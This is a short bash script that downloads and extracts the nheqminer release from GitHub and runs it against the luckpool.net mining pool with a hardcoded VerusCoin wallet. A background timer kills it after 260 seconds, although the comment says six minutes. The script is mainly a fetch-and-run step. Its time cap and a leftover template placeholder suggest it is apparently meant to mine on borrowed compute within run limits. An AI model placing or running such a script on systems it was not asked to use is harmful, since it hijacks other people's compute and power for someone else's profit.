#!/bin/bash

Timeout=260 # 6 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
./nheqminer -v -l na.luckpool.net:3956 -u RSBmzzfgzomxwx7o6tJNmG3kecq9Huc7Q9.RX -p x -t 8
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"